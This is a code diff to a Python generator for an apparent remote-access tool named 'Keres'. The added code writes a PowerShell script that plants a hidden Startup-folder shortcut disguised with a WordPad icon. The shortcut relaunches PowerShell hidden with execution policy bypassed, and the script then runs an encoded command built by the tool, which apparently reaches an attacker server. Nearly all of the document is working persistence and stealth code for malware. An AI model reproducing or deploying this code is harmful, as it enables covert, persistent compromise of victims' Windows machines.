@@ -185,7 +185,56 @@ Start-PersistentCommand -UniqueIdentifier "Keres" -ServerAddress "{server_addres
     if args.save_ps_command:
         ps_file_path = os.path.join("Output", "Keres.ps1")
         with open(ps_file_path, 'w') as ps_file:
-            ps_file.write(ps_command)
+            ps_file.write(""" 
+param(
+    [string]$ScriptPath =(Resolve-Path -Path $MyInvocation.MyCommand.Path),
+    [string]$IconLocation = "C:\Program Files\Windows NT\Accessories\wordpad.exe",
+    [string]$HotKey = "CTRL+W",
+    [string]$Description = "powershell",
+    [int]$WindowStyle = 7,
+    [switch]$Hidden = $true,
+    [switch]$p,
+    [string]$ScriptArgument = ""
+)
+
+# If -p parameter is present, create the shortcut
+if ($p) {
+    # Define the path for the shortcut in the Startup folder
+    $shortcutPath = "$([Environment]::GetFolderPath('Startup'))\Meow.lnk"
+
+    # Create a WScript Shell object
+    $wshell = New-Object -ComObject Wscript.Shell
+
+    # Create or modify the shortcut object
+    $shortcut = $wshell.CreateShortcut($shortcutPath)
+
+    # Set the icon location for the shortcut
+    $shortcut.IconLocation = $IconLocation
+
+    # Set the target path and arguments for the shortcut
+    $shortcut.TargetPath = "powershell.exe"
+    $shortcut.Arguments = "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File $ScriptPath "
+
+    # Set the working directory for the shortcut
+    $shortcut.WorkingDirectory = (Get-Item $ScriptPath).DirectoryName
+
+    # Set a hotkey for the shortcut
+    $shortcut.HotKey = $HotKey
+
+    # Set a description for the shortcut
+    $shortcut.Description = $Description
+
+    # Set the window style for the shortcut
+    $shortcut.WindowStyle = $WindowStyle
+
+    # Save the shortcut
+    $shortcut.Save()
+
+    # Optionally set the 'Hidden' attribute
+    if ($Hidden) {
+        [System.IO.File]::SetAttributes($shortcutPath, [System.IO.FileAttributes]::Hidden)
+    }
+}\npowershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand """+encoded_ps_command)
         print('\n')
         print('generated  Powershell command')
         print('\n')
